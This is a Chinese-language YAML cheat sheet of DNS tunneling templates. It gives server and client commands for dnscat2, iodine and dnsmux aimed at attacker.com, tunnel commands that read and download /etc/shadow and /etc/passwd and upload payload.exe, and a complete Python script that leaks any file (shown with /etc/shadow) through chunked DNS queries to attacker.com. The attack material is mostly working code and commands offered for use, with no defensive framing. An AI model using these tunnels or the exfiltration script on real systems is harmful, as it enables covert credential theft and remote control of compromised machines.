# DNS隧道技术
dns_tunneling:
  - basic_concept:
    description: |
      # DNS隧道原理

      # DNS是几乎总是被允许出站的协议
      # 通过DNS查询/响应传输数据

      # 数据编码方式:
      # 1. 子域名编码: data.attacker.com
      # 2. TXT记录编码: 在TXT响应中传输
      # 3. CNAME记录编码: 通过CNAME传输

      # 工作流程:
      # 客户端 -> DNS查询(data.target.com) -> DNS服务器
      # DNS服务器 -> 转发到攻击者DNS -> 返回响应
      # 响应中携带数据/指令

  - dnscat2_usage:
    template: |
      # dnscat2 DNS隧道

      # 1. 服务器端 (攻击者DNS服务器)
      ruby dnscat2.rb --dns "port=53,domain=attacker.com" --no-cache

      # 2. 客户端 (目标机器)
      ./dnscat --dns domain=attacker.com

      # 3. dnscat2命令

      # 查看会话
      sessions

      # 选择会话
      session -i 1

      # 执行命令
      exec whoami
      exec cat /etc/shadow

      # 下载文件
      download /etc/passwd

      # 上传文件
      upload payload.exe

      # Shell交互
      shell

      # 4. 通过DNS传输文件
      # 分段编码传输

  - iodine_usage:
    template: |
      # iodine DNS隧道

      # 特点: 创建虚拟网络接口

      # 1. 服务器端
      iodined -f -c -P password 10.0.0.1 attacker.com

      # 2. 客户端
      iodine -f -P password attacker_dns attacker.com

      # 3. 连接后创建虚拟接口
      # 本地: 10.0.0.2
      # 远程: 10.0.0.1

      # 4. 通过虚拟接口通信
      ssh root@10.0.0.1
      nmap -sT 10.0.0.1

      # 5. 数据传输
      # 通过虚拟IP直接传输

  - dnsmux_usage:
    template: |
      # Dnsmux - DNS隐蔽通信

      # 1. 创建服务器
      python dnsmux.py server -d attacker.com -p 53

      # 2. 客户端连接
      python dnsmux.py client -d attacker.com

      # 3. 传输文件
      send_file /etc/shadow
      recv_file downloaded_file

  - dns_exfiltration_script:
    template: |
      # DNS数据外带Python脚本

      import dns.resolver
      import base64

      class DNSExfiltrator:
          def __init__(self, domain):
              self.domain = domain
              self.chunk_size = 30  # DNS标签限制

          def encode_data(self, data):
              """Base32编码(避免特殊字符)"""
              return base64.b32encode(data).decode()

          def send_chunk(self, chunk, seq):
              """发送单个DNS查询"""
              query = f"{seq}.{chunk}.{self.domain}"
              try:
                  dns.resolver.resolve(query, 'A')
                  return True
              except:
                  return False

          def exfiltrate_file(self, filepath):
              """外带文件"""
              with open(filepath, 'rb') as f:
                  data = f.read()

              encoded = self.encode_data(data)
              chunks = [encoded[i:i+self.chunk_size]
                        for i in range(0, len(encoded), self.chunk_size)]

              for seq, chunk in enumerate(chunks):
                  self.send_chunk(chunk, seq)
                  print(f"Sent chunk {seq}/{len(chunks)}")

      # 使用
      exfil = DNSExfiltrator("attacker.com")
      exfil.exfiltrate_file("/etc/shadow")

